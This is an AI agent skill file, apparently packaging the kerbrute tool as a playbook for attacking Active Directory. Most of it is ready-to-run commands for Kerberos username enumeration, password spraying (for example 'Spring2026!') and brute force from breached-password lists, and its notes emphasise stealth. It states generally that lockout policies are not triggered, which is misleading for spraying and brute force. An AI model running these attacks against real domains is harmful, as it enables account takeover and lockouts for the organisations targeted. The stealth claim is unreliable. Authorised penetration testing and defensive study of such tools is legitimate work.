---
name: kerbrute-kerberos-enum
description: "kerbrute performs pre-auth enumeration, password spraying, and targeted breach-password brute force. Signals: brute force, password spraying, dictionary cracking, thread count."
zh-signals: "kerbrute: 预认证枚举+口令喷洒、从 breach 密码定向爆破。信号:暴力破解,口令喷射,从密码字典爆破,线程数。"
when-to-use: "Use during Active Directory assessment to enumerate valid users via Kerberos pre-auth, then spray or brute force passwords against identified accounts. Requires a domain, a user list, and an optional wordlist or thread count."
---

# kerbrute

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/ropnop/kerbrute
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
go install github.com/ropnop/kerbrute@latest
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `userenum -d corp.local --dc dc01.corp.local users.txt` | Kerberos username enumeration (does not lock accounts) |
| `bruteforce -d corp.local --dc dc01 passwords.txt` | Brute force from a password wordlist |
| `passwordspray -d corp.local --dc dc01 users.txt Passw0rd!` | Password spraying |
| `-t 20` | Thread count |
| `-o out.txt` | Output |

## Attack Scenario Playbook

### Pre-auth enumeration plus password spraying

```bash
kerbrute userenum -d corp.local --dc dc01.corp.local names.txt -o valid.txt
kerbrute passwordspray -d corp.local --dc dc01.corp.local valid.txt 'Spring2026!' -o spray.txt
```

### Targeted brute force with breached passwords

```bash
kerbrute bruteforce -d corp.local --dc dc01.corp.local breached-creds.txt
```

## Notes

Kerberos pre-auth error codes distinguish 'user does not exist/wrong password/account locked', and AD account lockout policies are not triggered, making it stealthier than SMB brute force.
